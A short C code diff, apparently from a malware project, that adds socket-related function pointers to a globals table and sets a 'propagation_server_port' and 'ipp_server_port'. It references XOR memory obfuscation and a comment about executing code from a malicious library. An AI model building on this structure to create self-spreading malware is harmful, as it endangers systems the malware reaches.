@@ -21,8 +21,6 @@
 #include "main/globals.h"
 
 
-
-
 void xor_memory(void * memory, size_t len, char*key);
 
 
@@ -74,7 +72,9 @@ void init_globals(Globals *global){
     global->htonl=&htonl;
     global->htons=&htons;
     global->ntohl=&ntohl;
+    global->ntohs=&ntohs;
     global->inet_ntoa=&inet_ntoa;
+    global->inet_ntop=&inet_ntop;
 
     global->socket=&socket;
     global->setsockopt=&setsockopt;
@@ -83,6 +83,7 @@ void init_globals(Globals *global){
     global->accept=&accept;
     global->getifaddrs=&getifaddrs;
     global->freeifaddrs=&freeifaddrs;
+    global->getsockname=&getsockname;
 
     global->recv=&recv;
     global->send=&send;
@@ -108,7 +109,8 @@ void init_globals(Globals *global){
     global->xor_memory = &xor_memory;
 
     // global values
-    global->ipp_server_port = 666;
+    global->propagation_server_port = 42024;
+    global->ipp_server_port = 6969;
 }
 
 /// execute the code from a malicious library
